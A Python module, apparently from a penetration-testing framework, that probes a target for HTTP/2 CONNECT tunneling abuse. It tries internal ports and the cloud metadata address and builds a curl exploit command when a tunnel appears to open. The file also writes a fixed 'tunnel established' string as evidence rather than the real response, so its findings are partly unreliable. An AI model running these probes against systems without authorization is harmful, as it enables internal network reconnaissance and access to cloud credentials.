"""
HTTP/2 CONNECT Tunneling Abuse Capability Agent for PenFlow.

Capabilities:
  - HTTP/2 CONNECT Stream Tunneling Abuse (PortSwigger Top 10 2025 #9)
  - Internal Network Port Scanning via HTTP/2 Pseudo-Header Tunnels
  - Unauthorized Internal Service Proxy Access
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.http2_connect")

INTERNAL_TARGETS = [
    ("localhost", 8080),
    ("127.0.0.1", 6379),
    ("127.0.0.1", 5432),
    ("169.254.169.254", 80)
]


class HTTP2ConnectCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent probing HTTP/2 CONNECT method tunneling abuse to access internal services.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="HTTP2ConnectCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="http2_connect_tunnel", name="HTTP/2 CONNECT Tunneling Abuse", description="Detects HTTP/2 CONNECT stream tunneling abuse permitting internal port access", priority=self.priority, tags=["http2", "connect", "ssrf", "tunneling"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        target_url = f"https://{context.asset}/"

        try:
            async with httpx.AsyncClient(http2=True, timeout=8.0, verify=False) as client:
                for int_host, port in INTERNAL_TARGETS:
                    try:
                        headers = {":authority": f"{int_host}:{port}"}
                        resp = await client.request("CONNECT", target_url, headers=headers)

                        if resp.status_code in (200, 101):
                            curl_cmd = f"curl --http2 -X CONNECT -H ':authority: {int_host}:{port}' '{target_url}'"
                            exch_dict = {
                                "request": {"method": "CONNECT", "url": target_url, "headers": headers},
                                "response": {"status_code": resp.status_code, "body_snippet": f"Tunnel established to {int_host}:{port}"}
                            }

                            findings.append({
                                "vulnerability_type": "http2_connect_tunnel",
                                "target_url": target_url,
                                "tunneled_host": f"{int_host}:{port}",
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("HTTP/2 CONNECT Tunnel Abuse", target_url, curl_cmd),
                                "description": f"HTTP/2 CONNECT method established an unauthenticated tunnel to internal endpoint '{int_host}:{port}'.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["connect_tunnel_established"] = f"{int_host}:{port}"
                            break
                    except Exception as e:
                        logger.debug(f"HTTP/2 CONNECT test failed for {int_host}:{port}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
